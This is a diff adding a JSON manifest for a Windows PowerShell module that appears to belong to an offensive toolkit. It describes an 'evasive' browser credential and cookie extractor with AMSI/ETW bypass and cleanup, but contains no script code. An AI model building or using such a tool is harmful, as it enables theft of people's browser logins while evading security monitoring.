@@ -1,0 +1,17 @@
+{
+  "name": "chrome",
+  "version": "2.0.0",
+  "platform": "windows",
+  "arch": "any",
+  "description": "Evasive browser credential extractor \u2014 AMSI/ETW bypass, raw SQLite parsing (no external libs), multi-browser support, temp cleanup",
+  "type": "ps1",
+  "commands": [
+    "chrome_dump",
+    "chrome_cookies"
+  ],
+  "files": {
+    "chrome.ps1": ""
+  },
+  "author": "ruby570bocadito",
+  "evasive": true
+}
